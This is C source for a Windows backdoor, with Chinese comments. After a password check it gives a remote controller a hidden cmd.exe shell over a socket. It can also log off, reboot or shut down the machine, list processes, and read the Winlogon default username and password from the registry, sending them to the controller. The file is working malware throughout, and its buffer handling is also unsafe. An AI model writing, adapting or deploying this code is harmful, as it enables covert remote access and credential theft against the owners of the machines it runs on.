#include <stdio.h>
#include <winsock.h>
#include <windows.h>
#include <tlhelp32.h>
#include "door.h"

int work = 1;

STARTUPINFO g_stStartUp;
PROCESS_INFORMATION g_stProcInfo;

//两个管道, 每个管道一个入口, 一个出口
HANDLE g_read1, g_write1;
HANDLE g_read2, g_write2;

char enter_key[2] = {0x0d, 0x0a};

int open_door(SOCKET target) {
    char buf[128] = {0};
    //密码验证下...
	while (1){
        //发送密码提示符
		send(target, "password:", 10, 0);	
        //接受密码
		recv(target, buf, 64, 0);
        //调整下接受到的字符串
		adjust_cmd(buf);
        //如果密码正确就放行
		if (0 == strcmp(buf, G_PASSWORD))
			break;
	}
    //发送个欢迎信息
    send(target, "--==[ welcome to my simple shell ]==--\n", 39, 0);
    //进入工作循环, work变量的状态控制工作状态
    while (work){
        //发送个命令提示符
        send(target, "#", 2, 0);
        //接受控制端的命令,放到buf中
        recv(target, buf, 128, 0);
        adjust_cmd(buf);
        //如果是退出指令就退出程序,这里是".bye"
        if ( 0 == strcmp(buf, ".bye"))
            work = 0;
        else if (0 == strcmp(buf, ".shell"))
            get_shell(target);
        else if (0 == strcmp(buf, ".logout"))
            shutdown_os(target, 0);
        else if (0 == strcmp(buf, ".reboot"))
            shutdown_os(target, 1);
        else if (0 == strcmp(buf, ".shutdown"))
            shutdown_os(target, 2);
        else if (0 == strcmp(buf, ".pass"))
            get_default_pass(target);
        else if (0 == strcmp(buf, ".plist"))
            list_process(target);
        //否则回馈错误消息
        else
            send(target, "[e]unknown command.\n", 20, 0);
    }
    return 0;
}


/*  get_shell: 创建cmd进程, 创建管道, 
 *  并且将cmd和本程序用管道连接
 *  @target: 控制端Socket描述符
 *  return: 0
 * */
int get_shell(SOCKET target){
	SECURITY_ATTRIBUTES stSecurity;
    //充填安全属性结构体
	stSecurity.nLength = sizeof(SECURITY_ATTRIBUTES);
	stSecurity.lpSecurityDescriptor = NULL;
	stSecurity.bInheritHandle = TRUE;
    //建立两个管道:
	CreatePipe(&g_read1, &g_write1, &stSecurity, 0);
	CreatePipe(&g_read2, &g_write2, &stSecurity, 0);

    //准备创建cmd进程.
    //充填g_stStartUp结构.这个结构暴长,
   	GetStartupInfo(&g_stStartUp);
    //把将启动的程序的标准输入设置成管道1的写入端
	g_stStartUp.hStdInput = g_read1;
    //标准输出以及标准错误输出设置成管道2的读取端
	g_stStartUp.hStdOutput = g_write2;
	g_stStartUp.hStdError = g_write2;
    //两个属性
	g_stStartUp.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    //不要显示cmd程序的窗口
	g_stStartUp.wShowWindow = SW_HIDE;
	if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE,
                    NORMAL_PRIORITY_CLASS, NULL, NULL,
                    &g_stStartUp, &g_stProcInfo))
	{
        DWORD bytes_read, bytes_write, ret;
        char buff[512] = {0};
		while (1) {
            //把缓冲清空
			memset(buff, '\0', 512);
            //检查下是否有数据在管道中
			PeekNamedPipe(g_read2, buff, 512, &bytes_read, NULL, NULL);
			if (bytes_read != 0) {  //如果有, 就读出来
				ret = ReadFile(g_read2, buff, bytes_read, &bytes_read, NULL);
				send(target, buff, strlen(buff), 0);
                if (ret <= 0) {
                    fprintf(stderr, "[e]Read pipe error:%d\n", GetLastError());
                    break;	
                }
			} else {                //否则就由用户输入
                bytes_read = recv(target, buff, 512, 0);
				if (bytes_read <= 0){
                    fprintf(stderr, "[e]recv error:%d\n", WSAGetLastError());
                    break;
                }
				adjust_cmd(buff);
                //将用户输入的命令写入管道
				WriteFile(g_write1, buff, strlen(buff), &bytes_write, NULL);
                WriteFile(g_write1, enter_key, 2, &bytes_write, NULL);
				if (0 == strcmp("exit", buff)) {//如果用户输入的是cmd的退出命令exit
                    //就退出cmd shell交互模式
					send(target, "[i]Exit CMD Modal.\n", 19, 0);
                    break;
				}


			}
			Sleep(100);
		}
		CloseHandle(g_stProcInfo.hProcess);
		CloseHandle(g_stProcInfo.hThread);
	}
    return 0;
}

/*  shutdown_os:  控制服务端OS的关机, 登出, 重启
 *  @target: 控制端Socket描述符
 *  @flag: 选项
 *  return: 0
 * */
int shutdown_os(SOCKET target, int flag){
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if (0 == flag) {	//Logout
		ExitWindowsEx(EWX_LOGOFF,0);
    } else {    		//reboot & shutdown
		if (GetVersion() < 0x80000000) {//NT中要设置权限
            //打开我们后门进程的令牌, 在此,我们需要查询并且调整这个令牌
			OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken);
			
            LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
			tkp.PrivilegeCount=1;
			tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
		}
		ExitWindowsEx(  //flag == 1就reboot, 否则 关机
            flag == 1 ? EWX_REBOOT: EWX_SHUTDOWN,
            0);
	}
	send(target,"[i]done!\n",9,0);
    return 0;
}

/*  list_process: 列举所有进程
 *  @target: 控制端Socket描述符
 *  return: 0
 * */
int list_process(SOCKET target) {
	char buff[128];
	//获得快照句柄
    HANDLE	process_snap = CreateToolhelp32Snapshot(
                            TH32CS_SNAPPROCESS,
                            0);
    //判断函数CreateToolhelp32Snapshot是否成功执行了。
	if((HANDLE) -1 == process_snap)
		return -1;

	PROCESSENTRY32 proc_entery32 = {0};	//pe32用来存放进程的详细信息
	//proc_entery32中的dwSize字段必须赋初值
    //否则在执行Process32First函数时会出错	
    proc_entery32.dwSize = sizeof(PROCESSENTRY32); 
    
	if (Process32First(process_snap, &proc_entery32)){
		do {			
			memset(buff, '\0', 128);
            //格式化一下输出到buff
			sprintf(buff, "%d  -> %s\n", 
                    proc_entery32.th32ProcessID,
                    proc_entery32.szExeFile);
            //发到客户端去
			send(target, buff, strlen(buff), 0);
		}while (Process32Next(process_snap, &proc_entery32));
	}		
    //清理下, 关掉句柄
	if(NULL != process_snap)
		CloseHandle(process_snap);
	return 0;
}


/*  get_default_pass: 获取默认登录的密码帐号
 *  @target: 控制端Socket描述符
 *  return: 0
 * */
int get_default_pass(SOCKET target) {
    HKEY key;
    char default_name[64]={0}, default_pass[64]={0};
    char send_buff[256];
    DWORD buff_size = 64, type;
    LPCSTR data_set="SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
	
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, data_set, 0, KEY_ALL_ACCESS, &key);
	RegQueryValueEx(key, "DefaultUserName", NULL, &type, default_name, &buff_size);
	RegQueryValueEx(key, "Defaultpassword", NULL, &type, default_pass, &buff_size);
   
    sprintf(send_buff, "[^]default user name:(%s); \n"
                       "[^]default password:(%s).\n", 
                       default_name[0] == 0 ? "I don't known." : default_name,
                       default_pass[0] == 0 ? "I don't known." : default_pass);
    send(target, send_buff, strlen(send_buff), 0);
	RegCloseKey(key);
    return 0;
}


/*  adjust_cmd: 调整字符串的末尾字符, 使之方便操作
 *  @in: 传入的指定被调整的字符串指针
 *  return: 该字符串指针
 * */
char *adjust_cmd(char *in) {
	int i=0;
    //将索引移动到末尾, 如果发现有回车或者换行
	while (in[i] != '\r' && in[i] != '\n' )
		i++;
    //就替换成\0
	in[i]='\0';
	return in;
}

